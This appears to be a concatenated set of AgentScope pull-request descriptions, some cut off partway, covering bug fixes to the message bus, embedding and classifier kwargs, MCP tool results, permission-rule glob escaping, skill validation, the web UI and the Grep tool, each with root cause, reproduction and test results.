Add a dependency-free browser regression fixture using the actual page, hooks, providers, and rendered DOM with controlled API responses. Run it via Vite at `/tests/knowledge-base-switch.html`; instructions are in the frontend README.

Companion English/Chinese documentation: https://github.com/agentscope-ai/docs/pull/90.

## Validation

Local runtime: macOS, Node.js 25.9.0/pnpm 11.25.0, and Python 3.12.13. Remote CI subsequently passed on Node.js 20/pnpm 10 and the Python 3.11 matrix (details below).

- `pre-commit run --all-files`: passed, including the staged regression fixture.
- `pnpm format:check`: passed; 20 existing lint warnings, unchanged from the untouched baseline.
- `pnpm build`: frontend and backend passed; existing bundle/browser-externalization warnings remain.
- Browser regression: 9/9 checks passed, covering pending/failed switches, deletion-confirmation reset, empty lists, late responses, same-base refetch, and polling's final chunk count. Removing only the new key makes 3 checks fail; restoring it returns all 9 to PASS.
- Full Python suite in a fresh `.[dev]` environment, with a 30-second per-test timeout: **2849 passed, 147 skipped, 683 subtests passed, 4 failed**. Three failures are S3/Moto PUT timeouts in `tests/blob_store_s3_test.py` (`test_exists_and_delete`, `test_size_measures_the_stored_object`, `test_write_open_round_trip`); they also time out when the file is run alone. title: fix(message-bus): refresh in-memory queue ttl on push
body:
## AgentScope Version

`2.0.11dev` (base `ed357feb78a45ff02df155bb5610eab9bf543832`)

## Description

Fixes #3419

`MessageBus.queue_push` specifies a sliding TTL for the queue key, and the Redis backend refreshes that key's expiry after each push. The in-memory backend previously expired individual entries, so an earlier queued payload could disappear while later payloads remained. In the channel gateway, this could drop an earlier buffered image before a following text message drained the media queue.

This change tracks a deadline per in-memory queue key. A push with `ttl_secs` refreshes the whole queue's deadline; a zero TTL removes the whole queue; a push without a TTL retains an existing deadline, matching Redis. Expired queues are removed lazily on push or drain. The shared, Redis, and in-memory docstrings now describe the same behavior.

Regression tests cover the queue's sliding TTL, zero TTL on an existing queue, a push without TTL after a full drain, and the channel gateway's media aggregation path. The new regressions failed on the unmodified implementation and pass with this fix.

### Validation

- `pytest tests/in_memory_message_bus_test.py tests/channel_gateway_test.py -q`: **61 passed**.
- `pre-commit run --all-files`: **passed** after its format hooks updated one test file; final rerun made no changes.

title: fix(message-bus): trim the redis replay log exactly when a cursor is given
body:
Fixes #3408

## AgentScope Version

`2.0.11dev`, based on `8a2aef4f1787f6aeb4b07a56bbc1d061c5aa7ef5`.

## Summary

`RedisMessageBus.log_trim(key, before_id=...)` handed `minid` to `redis-py`'s `xtrim` without turning off `approximate`, which defaults to `True`. The command that actually reached Redis was `XTRIM key MINID ~ <id>`, and approximate trimming stops at the first macro node it cannot drop whole, so the trim never landed on the cursor: a log below one node was left untouched, and a longer one kept up to a node's worth of already-persisted entries.

The abstract method documents "Drop all entries with id strictly older than this" (`_base.py:244`) and the in-memory backend implements it exactly (`_in_memory_message_bus.py:278`), so the two backends answered differently for the same call.

Passing `approximate=False` makes the Redis backend trim exactly to the cursor. The `log_append(max_len=...)` path keeps its deliberate approximate trim.

## Root cause

`src/agentscope/app/message_bus/_redis_message_bus.py:404` on `main` at `8a2aef4f1787f6aeb4b07a56bbc1d061c5aa7ef5`:

```python
await self._client.xtrim(key, minid=before_id)
```

`redis-py`'s `Redis.xtrim` is `xtrim(name, maxlen=None, approximate=True, minid=None, limit=None, ...)`, and it appends `b"~"` whenever `approximate` is true. With `~`, Redis only evicts whole macro nodes, so the trim stops at a node boundary — nothing at all when the whole log is a single node.

Measured before/after on plain `XADD` streams:

```
 60 entries, trim at #40   -> 60 left (expected 20)
250 entries, trim at #180  -> 150 left (expected 70)
1000 entries, trim at #950 -> 100 left (expected 50)
```

Both call sites that pass `before_id` are checkpoint compactions, and the service defaults to `RedisMessageBus` (`_app.py:151`, `:161`):

- `_service/_chat.py:1509` — trims `session_events` before `checkpoint_cursor` after a turn is persisted.
- `_service/_webrtc_session.py:256` — same for a WebRTC session.

## Changes

- `src/agentscope/app/message_bus/_redis_message_bus.py`: pass `approximate=False`, with a comment explaining why the library default is wrong for this call.
- `tests/service_message_bus_test.py`: add `test_trim_with_before_id_keeps_newer`, mirroring the case the in-memory suite already has at `in_memory_message_bus_test.py:153`.

## Validation

- The new test fails on the unmodified checkout (`[1, 2, 3]`) and passes with the change (`[2, 3]`).
- `pytest tests/service_message_bus_test.py tests/in_memory_message_bus_test.py` → **79 passed** (78 before).
- Cross-backend check, same operations against both implementations: 23 operation scenarios (queue, log, broadcast, lock, registry, session guard, inbox, wakeup, background tasks) plus 7 boundary cases around the trim (cursor at the first entry, cursor at the last entry, repeated trim, missing key, append after trim, read after trim with an older cursor). Before the change the trim disagreed; after it, **30/30 agree**.
- `pytest tests/session_event_stream_test.py tests/channel_stream_test.py tests/service_chat_locking_test.py tests/service_chat_run_context_test.py tests/service_chat_channel_delivery_test.py` → **15 passed**.
- Safety of deleting pre-checkpoint entries: the module uses no consumer groups (`queue_drain` is a Lua `XRANGE` + `XDEL`), so exact trimming cannot leave stale PEL references; every replay path reads with `since=<checkpoint cursor>` (`channel/_stream.py` documents that replay starts after the persisted checkpoint), so dropping those entries matches the intended design.

title: feat(embedding): let a per-call output_dimensionality reach the gemini config
body:
Fixes #3403

## Summary

`GeminiEmbeddingModel.__call__` / `_call_api` document `**kwargs` as "merged
into the Gemini `EmbedContentConfig`" and the `parameters` docstring states
"**Per-call options take precedence.**" Passing the one config field that is
also bound as a literal keyword at both call sites — `output_dimensionality` —
raises `TypeError: google.genai.types.EmbedContentConfig() got multiple values
for keyword argument 'output_dimensionality'` while the call is being built, so
no request goes out and no provider error is available.

Fold the instance default ahead of the caller's kwargs inside a single dict, so
each name is forwarded exactly once and the per-call value wins.

## Root cause

`src/agentscope/embedding/_gemini/_model.py:330-337` and `:424-427` on `main` at
`26ec620b8adbd30cfa1e45f349df2eaea611f10d`:

```python
config_kwargs = {
    **self.parameters.model_dump(exclude_none=True),
    **kwargs,                       # may carry output_dimensionality
}
config = types.EmbedContentConfig(
    output_dimensionality=self.dimensions,   # bound a second time
    **config_kwargs,
)
```

`task_type`, `safety_identifier`-style knobs and every other `Parameters` field
go through the dict and honour the documented precedence; `output_dimensionality`
is passed next to the splat, so it is the only documented per-call option that
cannot be used. The multimodal path (`gemini-embedding-2`) repeats the same
double bind with `**kwargs` directly.

This is the half of #3361 (`a3a06fd0`, "honor configured Gemini text
parameters") that that PR left standing: it introduced `config_kwargs`, wrote the
"Per-call options take precedence" sentence at `:122-123`, and folded
`task_type` in — but kept `output_dimensionality=self.dimensions` as an explicit
argument. Its own test,
`tests/embedding_gemini_test.py::test_configured_parameters_and_call_precedence`,
asserts the contract for `task_type` and expects `"output_dimensionality": 2` in
the config; nothing covers the override case, which is why the gap survived.

The same "instance default first, caller kwargs after, one dict literal" shape
already exists in this repo at `embedding/_openai/_model.py:135-137` and
`embedding/_ollama/_model.py:108-109`, and #3391 (`430fbc78`) applied it to
`OpenAIClassifierModel`.

## Reproduction, before → after

The script from #3403, run against pristine `src/` at `26ec620b` (`PYTHONPATH`
pointed at that worktree; load path self-reported by `agentscope.__file__` =
`…/worktrees/probe-gemini-1022/src/agentscope/__init__.py`):

```
gemini-embedding-001 ['task_type'] -> ok, config={'task_type': 'RETRIEVAL_DOCUMENT', 'output_dimensionality': 2}
gemini-embedding-001 ['output_dimensionality'] -> TypeError: google.genai.types.EmbedContentConfig() got multiple values for keyword argument 'output_dimensionality'
gemini-embedding-2 ['task_type'] -> ok, config={'task_type': 'RETRIEVAL_DOCUMENT', 'output_dimensionality': 2}
gemini-embedding-2 ['output_dimensionality'] -> TypeError: google.genai.types.EmbedContentConfig() got multiple values for keyword argument 'output_dimensionality'
```

With this patch (`…/worktrees/fix-gemini-percall-dims/src/…`):

```
gemini-embedding-001 ['task_type'] -> ok, config={'task_type': 'RETRIEVAL_DOCUMENT', 'output_dimensionality': 2}
gemini-embedding-001 ['output_dimensionality'] -> ok, config={'output_dimensionality': 4}
gemini-embedding-2 ['task_type'] -> ok, config={'task_type': 'RETRIEVAL_DOCUMENT', 'output_dimensionality': 2}
gemini-embedding-2 ['output_dimensionality'] -> ok, config={'output_dimensionality': 4}
```

The two `task_type` lines are byte-identical before and after: when `kwargs`
does not contain the name, the merged dict produces exactly the config that the
old explicit argument produced. That is also why no existing expectation moves.

The `cache_key` at `:339-343` is derived from the same `config_kwargs`, so it
keeps carrying the effective `output_dimensionality` — an overridden dimension
cannot reuse another request's cached vectors, which is what
`test_file_cache_uses_effective_parameters` guards.

## Tests

New `GeminiPerCallDimensionsTest` in `tests/embedding_gemini_percall_test.py` —
four cases (text override, text default, multimodal override, override keeps the
configured `task_type`), each a whole-structure `assertEqual` on the SDK call
payload per `.github/copilot-instructions.md`, in its own class so
`embedding_gemini_test.py` keeps its method count.

- before (pristine `26ec620b` `src/`, new tests plus the existing Gemini file):
  `3 failed, 11 passed, 6 subtests passed in 2.01s` — all three failures are the
  `TypeError` above, raised from `_model.py:334`.
- after (same command, this branch at `676fc36a`): `14 passed, 6 subtests passed
  in 1.57s`.
- Full suite on this branch: `2872 passed, 126 skipped, 675 subtests passed in 240.23s (0:04:00)`, exit code 0 (base `26ec620b` + commit `676fc36a`)
- Lint: `pre-commit run --all-files` — the exact command of
  `.github/workflows/pre-commit.yml`, i.e. the `run (ubuntu-latest)` check — on
  this tree → exit code 0, 15 hooks Passed, 1 Skipped (no matching file types);
  mypy, black, flake8 and pylint are among the Passed ones.
  One note for transparency: the *changed-files* invocation that a local
  `git commit` uses reports `src/agentscope/embedding/_gemini/_model.py:98:
  error: Name "GeminiEmbeddingModel.Parameters" is not defined [name-defined]`.
  That line is untouched by this PR and the error reproduces identically on
  unmodified `main` (verified by running the same hook against pristine `26ec620b`
  and against `embedding/_openai/_model.py:37`): with `--follow-imports=skip`,
  mypy can only see `Parameters` when `embedding/_embedding_base.py` is also a
  check root, which is the case in `--all-files` mode and not in per-file mode.
  This commit therefore ran with `SKIP=mypy` after the whole-tree run above had
  already exercised that hook on this code; the other 15 hooks ran for real.
  No `# type: ignore` was added, since CI's mode does not need one.

## Collisions checked

Against the changed-files list of all 280 open PRs (table rebuilt for this round
with the eleven PRs opened since the last sweep, self-checked "PRs with zero file
rows: 0"): **no open PR touches `src/agentscope/embedding/_gemini/**` or
`tests/embedding_gemini_*`** — zero hits, so this patch sits in a clean lane.

Four open PRs do change sibling providers under `embedding/` — #3393 (`_ollama`),
#3142 and #3036 (`_openai`), #3367 (`_dashscope`) — different files, and none of
them touches the two Gemini call sites.

## Test plan

- [x] `pytest tests/embedding_gemini_percall_test.py tests/embedding_gemini_test.py`
      before → `3 failed, 11 passed, 6 subtests passed`; after →
      `14 passed, 6 subtests passed`
- [x] the #3403 repro script before → two `TypeError`s; after → four `ok` lines
      with `output_dimensionality: 4` reaching the config
- [x] full `pytest tests` on this branch → `2872 passed, 126 skipped, 675 subtests passed`, exit 0
- [x] `pre-commit run --all-files` (the command the `run (ubuntu-latest)` check
      executes) → exit 0, all 16 hooks reported, including mypy Passed
- [ ] live calls against the Gemini `embed_content` endpoint (needs an API key;
      the defect is Python argument binding, so the mocked client asserts the
      exact payload the SDK receives)

title: feat(model): make DeepSeek thinking_enable tri-state so unset no longer force-sends thinking.type=disabled
body:
## AgentScope Version

2.0.10dev (main @ `7c198c5`)

## Description

`DeepSeekChatModel.Parameters.thinking_enable` is declared as a non-optional `bool` with `default=False` (`src/agentscope/model/_deepseek/_model.py:39`), and `_call_api` builds `thinking.type` **unconditionally** — so every request carries `extra_body["thinking"] = {"type": "disabled"}` even when the caller never configured anything. There is no way to express "unset, let the server default apply", which silently disables thinking on DeepSeek hybrid-reasoning models relative to a bare DeepSeek API call.

**Changes** (mirrors the volcengine model, whose near-identical block at `model/_volcengine/_model.py:209-222` is already wrapped in the intended tri-state guard):

- `thinking_enable: bool = Field(default=False, ...)` → `bool | None = Field(default=None, ...)`;
- the request-building block is wrapped in `if self.parameters.thinking_enable is not None:` — verbatim volcengine style, no new patterns.

| caller configuration | before | after |
|---|---|---|
| unset (`None`) | force-sends `thinking.type=disabled` | **not sent** — server default applies |
| explicit `False` | sends `disabled` | unchanged |
| explicit `True` | sends `enabled` | unchanged |

Complementary to #3069 (extra_body mutation fix): that PR stopped the caller's `thinking` dict from being pinned by `setdefault`; this one stops the *unset* case from force-sending `disabled` at all. Same tri-state direction as #3191/#3192 for DashScope. Callers who relied on the old implicit default (nothing configured → thinking disabled) must now pass `thinking_enable=False` explicitly.

## How to test

title: feat(classifier): let per-call options override the Decisions defaults
body:
Fixes #3390

## Summary

`OpenAIClassifierModel.__call__` documents `**kwargs` as options forwarded to
`client.decisions.create`, then passes `model=` and `input=` *next to* that
splat. A caller who follows the documented contract with either of those two
names — `model=` being the obvious "use a cheaper model for this one
classification" — hits `TypeError: got multiple values for keyword argument
'model'` while the call is being built, i.e. before the SDK is entered.

Merge the instance defaults under the caller's kwargs into one dict so each name
is forwarded exactly once and the per-call value wins.

## Root cause

`src/agentscope/classifier/_openai/_model.py:203-210` on `main` at
`58da57a565832ac3710d0f22318a5d0ee326a406`:

```python
response = await self.client.decisions.create(
    model=self.model,
    input=_to_sdk_input(state),
    questions=[...],
    **kwargs,
)
```

`model` and `input` are supplied twice whenever `kwargs` carries either name.
No network, API key or provider behaviour is involved — the crash is Python
argument binding, which is why the repro in #3390 stubs `openai.AsyncOpenAI` and
runs as-is.

Two things mark this as unintended rather than a designed restriction:

- the three names the docstring happens to list (`safety_identifier`,
  `extra_headers`, `extra_body`) all work — only the two that collide fail;
- the repo already fixes this exact shape elsewhere by putting the instance
  default *ahead of* `**kwargs` inside a single dict literal:
  `embedding/_openai/_model.py:135-137` (`"model": self.model`) and
  `embedding/_ollama/_model.py:108-109` (`"dimensions": self.dimensions`).
  #3332 / #3333 applied the same rule to the ASR `transcribe` call.

`questions=` deliberately keeps its own entry in the merged dict rather than
becoming caller-overridable: it is derived from a required positional parameter,
and letting a caller replace it silently would be a different decision from
letting a caller replace `model`.

## Reproduction, before → after

The script in #3390, run against pristine `src/` at `58da57a5` (`PYTHONPATH`
pointed at this worktree, load path self-reported by `agentscope.__file__`):

```
loaded agentscope from: …/worktrees/probe-1021/src/agentscope/__init__.py
version: 2.0.11dev
model: TypeError -> <AsyncMock name='mock.decisions.create' id='4428302960'> got multiple values for keyword argument 'model'
input: TypeError -> <AsyncMock name='mock.decisions.create' id='4428420048'> got multiple values for keyword argument 'input'
safety_identifier: ok, sdk got model='gpt-6-luna' input='I was charged twice.' safety_identifier='sid-1'
```

With this patch:

```
loaded agentscope from: …/worktrees/fix-classifier-percall/src/agentscope/__init__.py
version: 2.0.11dev
model: ok, sdk got model='gpt-6-mini' input='I was charged twice.' model='gpt-6-mini'
input: ok, sdk got model='gpt-6-luna' input='raw sdk input' input='raw sdk input'
safety_identifier: ok, sdk got model='gpt-6-luna' input='I was charged twice.' safety_identifier='sid-1'
```

New tests (`OpenAIClassifierPerCallOptionsTest` in `tests/classifier_openai_test.py`,
whole-`assertDictEqual` structure comparisons per `.github/copilot-instructions.md`,
kept in its own class so the existing class keeps its method count):

- before (pristine `58da57a5` `src/`, new tests only):
  `2 failed, 5 passed, 4 subtests passed in 1.96s` — both failures are the
  `TypeError` above, raised from `_model.py:203`.
- after (same command, patched tree): `7 passed, 4 subtests passed in 1.11s`.

The 5 passes are the pre-existing cases in that file; none of their expectations
moved, because for a kwargs dict that does not contain `model`/`input` the merged
payload is identical to the old explicit arguments.

Full suite on this tree (base `58da57a5` + commit `6da1c3ad`):
`2834 passed, 126 skipped, 651 subtests passed in 211.88s`, exit code 0 — no
failures to attribute.

`git commit` ran all 16 configured hooks: `check python ast`, `check docstring is
first`, `fix python encoding pragma`, `detect private key`, `trim trailing
whitespace`, `Add trailing commas`, `mypy`, `black`, `flake8`, `pylint`,
`Check package with Pyroma` → Passed; the 5 file-type filters (`sort simple yaml
files`, `check yaml`, `check xml`, `check toml`, `check json`) reported "no files
to check" → Skipped, since this diff is Python-only.

## Collisions checked

Against the changed-files list of all 296 open PRs (table rebuilt for this
round, including the six PRs opened since the last sweep): **no open PR touches
`src/agentscope/classifier/**` or `tests/classifier_openai_test.py`** — the
classifier subtree has zero hits, so this patch sits in a clean lane.

`JevClassifierModel` (`classifier/_jev/_model.py:152-153`) has the identical
shape and is deliberately *not* included: its tests are gated behind
`pytest.importorskip("typesafe_sdk")`, that optional dependency is not installed
in my environment, so I cannot show a red→green run for it. Per the repo's
"keep PRs atomic / reviewer time is precious" rules I would rather send no change
than an unverified one; I flagged it in #3390 instead.

## Test plan

- [x] `pytest tests/classifier_openai_test.py` before → `2 failed, 5 passed,
      4 subtests passed`; after → `7 passed, 4 subtests passed`
- [x] the #3390 repro script before → two `TypeError`s; after → three `ok` lines
- [x] full `pytest tests` on the patched tree → `2834 passed, 126 skipped,

title: feat(mcp): keep an MCP structured tool result
body:
Fixes #3388

## PR Title Format

`fix(tool): keep an MCP structured tool result`

## AgentScope Version

2.0.11dev (base: `main` @ 58da57a)

## Description

An MCP tool that declares an `outputSchema` may return its payload only in
`CallToolResult.structuredContent`. `MCPTool.call()` converted
`CallToolResult.content` only, so such a call produced a `ToolChunk` with no
blocks: the next request carried an empty tool result (`content: ""` for
OpenAI, `{"output": ""}` for Gemini, `(empty tool output)` for Anthropic) and
the model lost the result entirely, without any log line.

**Change** (`src/agentscope/tool/_adapters.py`): after converting
`result.content`, append `json.dumps(result.structured_content,
ensure_ascii=False)` as a `TextBlock` when the converted content contains no
text block.

- Empty `content` + `structuredContent` → the JSON is the tool result.
- Media-only `content` + `structuredContent` → image block keeps its JSON
  companion (a text block cannot carry it, so the spec's
  backwards-compatibility workaround is not even possible here).
- `isError` results keep their state and also carry the payload.
- Server already serialized the JSON into a text block → unchanged, no
  duplicated payload.
- No `structuredContent` → unchanged.

The stateful (`session`) and stateless (`client_gen`) paths both go through
`call()`, so both are covered by the single change.

**Tests**: new `tests/mcp_tool_result_test.py` (5 cases, fake session, no
network or server process needed). Before the change the three payload cases
fail (`0 != 1`); after the change all 5 pass. Existing MCP suite still passes:
`tests/mcp_client_reconnect_test.py`, `tests/mcp_sse_client_test.py`,
`tests/mcp_streamable_http_client_test.py` → 11 passed.

**Checks**: `black --line-length=79`, `flake8 --extend-ignore=E203`,
`pylint` (10.00/10 with the repo's disable list), `mypy` (repo args) all clean
on the two touched files.

Note on overlap: my open #3372 also edits `src/agentscope/tool/_adapters.py`,
but in the name-composition hunk (~line 240); this change is in `MCPTool.call`
(~line 350). They are independent and merge in either order.

Out of scope here (same conversion function, reported in #3388):

title: fix(app): clean up background tasks after registration faults
body:
## AgentScope Version

2.0.11.dev0, based on `1a60e2d977c34e8b3a6de6461e04ab3554ce6b65`.

## Description

Fixes #3384.

When `registry_set` raises or the registration caller is cancelled, `register_task` currently exits before installing its completion callback. The supplied asyncio task keeps running, but its local handle is retained after completion and no global registry cleanup is attempted. If the write was accepted before the error or cancellation, a stale global entry can remain until its TTL expires.

Install the existing completion callback in `finally` around the registry write. This preserves the original registration exception or cancellation and keeps live tasks available for cancellation. The callback is installed only after the write attempt exits, so a task completing during registration cannot delete its entry before the write commits.

Regression tests use real asyncio tasks and an in-memory MessageBus with event-controlled write acknowledgement. They cover errors and caller cancellation before/after a simulated accepted write, normal registration and metadata, completion during successful/failed registration, already-completed tasks, session cancellation/isolation, and logged cleanup failures.

No public API, dependency, registry format, or retry policy changes. Global unregister remains best effort. A companion docs PR is not needed for this internal lifecycle fix.

## Validation

- Unmodified baseline: the initial 8 regression tests produced 4 expected failures on the error/cancellation paths and 4 passes.
- Final focused run: 24 passed (all 10 new regression tests plus 14 existing offload/cancel tests); 5 existing deprecation warnings.
- Full local suite: 2646 passed, 311 skipped, 7 failed; 270 subtests passed. All 7 failing test cases also fail when run against the unmodified baseline: 2 in `issue_triage_test.py::PristineCheckoutTest` and 5 in `realtime_agent_test.py`.
- The 2 Git-related failures report a corrupt local system Git configuration. With that configuration isolated via `GIT_CONFIG_NOSYSTEM=1`, both pass. Of the 5 realtime cases, 1 also passes in the isolated rerun and 4 still fail. These realtime failures are outside this patch; no realtime code or tests are changed.
- The same upstream baseline has a [successful Ubuntu/macOS/Windows CI run](https://github.com/agentscope-ai/agentscope/actions/runs/39384054416). This PR's own CI is still required; it will remain a draft until those checks pass.
- `pre-commit run --all-files`: passed, including mypy, Black, flake8, pylint and Pyroma (no hooks bypassed). On this Windows machine, `PYTHONPATH` points to the checkout's `src`; a process-local Git wrapper isolates the corrupt system Git config and an unusable global proxy without changing repository checks or global settings.

title: fix(tool): escape glob metacharacters in Write/Edit permission suggestions
body:
Fixes #3377

## Summary

`Write.generate_suggestions` / `Edit.generate_suggestions` build the rule the
user is asked to approve by appending `/**` to the *literal* parent directory of
the invoked path, and that string is later evaluated as an fnmatch pattern by
`match_rule`. Metacharacters in the path (`[`, `?`, `*`) are therefore
reinterpreted instead of matched literally. Escape the parent with
`glob.escape` before splicing.

## Root cause

`src/agentscope/tool/_builtin/_write.py:217-220` (identical block in
`_edit.py:240-243`):

```python
parent = self._backend.dirname(file_path)
pattern = (parent.rstrip("/\\") + "/**") if parent else "**"
```

`match_rule` then runs `fnmatch.fnmatch(file_path, rule_content)`
(`_write.py:193`, `_edit.py:216`). For
`file_path = "/tmp/reports [2024]/out.csv"` the emitted rule is
`/tmp/reports [2024]/**`, where `[2024]` is a one-character class. So the rule
the engine suggested for that call does not match that call, and does match
`/tmp/reports 2/other.csv` — a directory it was never derived from.

Both halves are engine-level, not theoretical: `Write`/`Edit` are
`is_read_only = False` (`_write.py:59`, `_edit.py:83`), so in
`PermissionMode.DEFAULT` the read-only fast path (`permission/_engine.py:168`)
is skipped, the allow rules really are consulted (`_engine.py:194-198`), and
step 6 (`_engine.py:201`) is what emitted the suggestion.

`Read`/`Glob`/`Grep` share the same splice (`_read.py:248`, `_glob.py:213`,
`_grep.py:248`) but are `is_read_only = True`: an ALLOW rule derived from their
suggestions is never reached, so changing them here would be a cosmetic diff
with no observable effect. I left them alone on purpose.

## Reproduction, before → after

The script in #3377, run against `main` at `402c3664f70cb339f397c5ee40e662bc0d99eed0`
(this PR's base, `PYTHONPATH` pointed at that tree):

```
1st check          -> ask ['/tmp/reports [2024]/**']
same call again    -> ask        # approving the suggestion bought nothing
unrelated sibling  -> allow      # it granted a different directory instead
```

With this patch:

```
1st check          -> ask ['/tmp/reports [[]2024]/**']
same call again    -> allow
unrelated sibling  -> ask
```

New tests (`tests/permission_suggestion_escape_test.py`, whole-structure
assertions per `.github/copilot-instructions.md`):

- before (pristine `402c3664`, unmodified `src/`): `5 failed, 1 passed in 0.66s`.
  The two engine round-trip tests fail with
  `<PermissionBehavior.ASK: 'ask'> != <PermissionBehavior.ALLOW: 'allow'>`,
  both sibling tests assert `True is not false`, and the bracketed-suggestion
  test diffs the emitted pattern
  (`- '/tmp/probe/reports [2024]/**' / + '/tmp/probe/reports [[]2024]/**'`).
  The one pass is the control case (metacharacter-free path), which already
  asserted `/tmp/probe/reports/**` and still does.
- after: `6 passed in 0.48s`.

Existing suites around the change, same patched tree: `279 passed, 383 subtests
passed in 3.70s` (`builtin_write_test`, `builtin_edit_test`, `builtin_read_test`,
`builtin_glob_test`, `builtin_grep_test`, `builtin_bash_test`,
`permission_engine_test`, `permission_mode_test`, `permission_bash_parser_test`,
plus the new file). No existing expectation had to move, because for a path
without metacharacters `glob.escape` returns it unchanged.

Full suite on this tree: `2824 passed, 126 skipped, 628 subtests passed in
214.37s`, exit code 0 — no failures to attribute.

`git commit` ran all 16 configured hooks: `check python ast`, `check docstring
is first`, `fix python encoding pragma`, `detect private key`,
`trim trailing whitespace`, `Add trailing commas`, `mypy`, `black`, `flake8`,
`pylint`, `Check package with Pyroma` → Passed; the 5 file-type filters
(`sort simple yaml files`, `check yaml`, `check xml`, `check toml`,
`check json`) reported "no files to check" → Skipped, since this diff is
Python-only.

## Collisions checked

#2942 (`fix(permission): make glob and grep suggestions match their own call`) is
the nearest neighbour by title, but it is a different defect: its pattern/matched
value mismatch is the missing trailing separator on a *directory*, which it fixes
inside `_glob.py`/`_grep.py`'s `match_rule`. It states that `Write`/`Edit` are
unaffected *by that* defect — true, their matched value is a file path — and it
does not address the metacharacter reinterpretation this PR fixes, which the
runs above reproduce on `402c3664`. No file overlap.

Against the changed-files list of all 290 open PRs (refreshed at filing time): no
open PR touches `tests/permission_suggestion_escape_test.py` (new file), and none
edits the `generate_suggestions` body lines in either source file. Six open PRs do
edit these two files, so here are their exact old-file hunk ranges, read off each
`@@` header via `gh api repos/…/pulls/<n>/files` (mine are `_write.py` 2–7 and
217–223, `_edit.py` 2–7 and 240–246):

| PR | `_write.py` hunks | `_edit.py` hunks | overlap with my hunks |
|----|-------------------|------------------|------------------------|
| #3178 | 2–7, 22–27, 190–195 | 2–7, 22–27, 213–218 | import block only; body 22 lines clear |
| #3207 | 2–7, 190–196 | 2–7, 213–219 | import block only; body 21 lines clear |
| #3214 | 19–25, 301–312 | 19–25, 409–417 | none; header 12 lines clear, body 78–163 |
| #3244 | 1–6, 20–25, 311–326 | 1–6, 20–25, 312–318, 424–437 | import region (1–6 vs 2–7); body 66–88 |
| #3083 | — | 418–424 | none |
| #3322 | — | 340–348 | none |

So the logic change sits in a clean lane; the only genuine overlap is the
`import` block, shared with #3178 / #3207 / #3244. If any of them lands first
this needs a one-line rebase, not a redesign. If you would rather not add a
stdlib import to these modules at all, the equivalent inline form is
`parent.replace("[", "[[]").replace("?", "[?]").replace("*", "[*]")` — same
output, no header hunk.

## Test plan

- [x] `pytest tests/permission_suggestion_escape_test.py` before → `5 failed,
      1 passed`; after → `6 passed`
- [x] `pytest` over the 9 permission/builtin-tool suites plus the new file →
      `279 passed, 383 subtests passed`
- [x] full `pytest tests` on the patched tree → `2824 passed, 126 skipped,
      628 subtests passed`, exit 0
- [x] all 16 pre-commit hooks ran at `git commit` on this branch → 11 Passed,
      5 Skipped (no matching file types)
- [ ] Docker/k8s-dependent suites (not exercised by this change; those cases are
      cluster-gated)

title: fix(workspace): validate SKILL.md front matter in the shared installers
body:
## PR Title Format

- `fix(workspace): validate SKILL.md front matter in the shared installers`
- Type `fix`, scope lowercase, subject starts with a lowercase letter.

## AgentScope Version

`2.0.11dev` (`main` at `402c3664`)

## Description

Fixes #3369.

The shared `WorkspaceBase.add_skill()` and `add_skill_archive()` only
checked that a `SKILL.md` file exists. The sandboxed workspaces — Docker,
E2B, K8s, AppleContainer, OpenSandbox and Bubblewrap — use those
implementations, so a skill without `name` / `description` was installed
successfully and then **silently omitted** by `list_skills()`: the caller
sees a successful install and an empty skill list.

`LocalWorkspace` already rejects the same input through
`_validate_skill()`, so the two backends disagreed. The service upload
path validates the archive manifest (single root, `SKILL.md` present)
but does not parse its front matter before calling
`add_skill_archive()`.

### Changes

- `src/agentscope/workspace/_base.py`
  - add `_read_skill_frontmatter()`, which parses `SKILL.md` with
    `utf-8-sig` and raises the same `ValueError` `LocalWorkspace` raises
    when `name` / `description` are missing;
  - call it from `add_skill()` (host-side file) and
    `add_skill_archive()` (staged file, before the final rename), so a

title: fix(webui): send a message that carries only an attachment
body:
## PR Title Format

`fix(webui): send a message that carries only an attachment`

## AgentScope Version

2.0.11dev (`main` at `a3a06fd`)

## Description

Fixes #3351.

The Web UI composer cannot send a message that consists only of a finished attachment, because both gates key off the text value:

- `handleSend` returns early on `!value.trim()`, so Enter and the send button do nothing.
- The primary-action selector tests `value.trim()` too, so with an empty composer it falls through to the realtime voice button even when an attachment is already processed.

The rest of the pipeline already supports such a turn. `handleSend` builds `blocks` from the processed files independently of the text, `useMessages.send` wraps those blocks in a `UserMsg`, and `/chat` accepts a message whose content is only a `DataBlock` — the auto-naming path in `app/_service/_chat.py` explicitly documents that a text-less turn (an image-only message) skips naming instead of failing.

### Change

One file, `examples/web_ui/frontend/src/components/chat/TextInput.tsx`:

- derive `hasReadyAttachment` from the files that finished processing (`status === 'done'` and a `block` is present), and `hasContent` from the text or that flag;
- use `hasContent` in the `handleSend` guard and in the primary-action selector, so the send arrow replaces the voice action as soon as an attachment is ready;
- a file that is still processing keeps blocking the send (`hasProcessing`), and a file that failed to process never enters the list, so no empty message can be sent.

### How I tested this

- `npm run build` (`tsc -b && vite build`) — passes.
- `npm run lint` — 0 errors; the 20 warnings are pre-existing and in untouched files. `eslint src/components/chat/TextInput.tsx` is clean.
- `npx prettier --check src/components/chat/TextInput.tsx` — clean.
- Backend side checked directly: `UserMsg(name="user", content=[DataBlock(...)])` constructs, and `get_text_content()` returns `None`, which is exactly the shape `_chat.py` already handles for an image-only turn.

`examples/web_ui` has no component-test harness (the Web UI job runs `format:check` and `build` only), so the change is covered by the type check, the build and the lint run above. Manual repro: attach an image, wait until it finishes processing, leave the composer empty, press Enter — the message is sent, and it renders as an attachment bubble without an empty text bubble.

No public API, dependency or documentation change.

title: fix(tool): ignore user ripgrep config in Grep
body:
## Summary

`Grep` shells out to `ripgrep` through the backend, and that subprocess inherits the process environment. When `RIPGREP_CONFIG_PATH` (or the per-user config) applies a flag such as `--fixed-strings`, the tool's documented regular-expression search silently becomes a literal search, and the agent receives a successful `No matches found` result for a pattern that does match.

This passes `--no-config` on the tool-owned `rg` invocation, so the search runs with exactly the options the tool builds. The backend interface and the explicit tool options are unchanged.

Fixes #3355

## Test

`tests/builtin_grep_test.py::GrepToolTest::test_search_ignores_user_ripgrep_config` writes a config containing `--fixed-strings`, points `RIPGREP_CONFIG_PATH` at it, and asserts that:

- a plain `rg` invocation under that config does **not** match `error42` with the pattern `error\d+`, so the config is genuinely in effect, and
- `Grep.call` still finds the match.

On the unpatched code the new test fails with `'error42' not found in 'No matches found for pattern: error\d+'`; with the fix it passes.

- `pytest tests/builtin_grep_test.py` — 16 passed, 6 subtests passed
- `flake8 --extend-ignore=E203` clean on the two touched files

## Notes

